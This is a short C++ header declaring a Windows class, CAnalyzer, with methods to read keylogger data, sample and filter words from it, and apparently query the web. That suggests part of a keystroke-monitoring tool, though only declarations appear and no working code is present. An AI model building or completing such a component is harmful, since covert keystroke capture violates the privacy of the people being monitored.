#ifndef _ANALYZER_
#define _ANALYZER_

#include "..\Common\Common.h"
#include "..\MainOperation\Sampling\Sampling.h"
#include "..\MainOperation\SearchWord\SearchWord.h"

#define FILE_LOGGER_PATH ""

class CAnalyzer
{
	CSampling	*m_pSampling;
	CSearchWord	*m_pSearchWord;
	HANDLE		m_hDataBase;

	std::string m_strURL;

	DWORD ReadKeyLoggerData(std::string &refstrSearchWord);
	DWORD SamplingWord(std::string &refstrSearchWord, std::string &refstrFilterWord);
	DWORD SearchWord(std::string &refstrFilterWord, ST_PROPER_WORD_RET &refstProperWordRet);
	//DWORD QueryToWeb(ST_PROPER_WORD_RET &refstProperWordRet);
public:
	CAnalyzer(HANDLE hDataBase);
	~CAnalyzer();

	DWORD StartAnalyzer(ST_PROPER_WORD_RET &refstProperWordRet);
};


#endif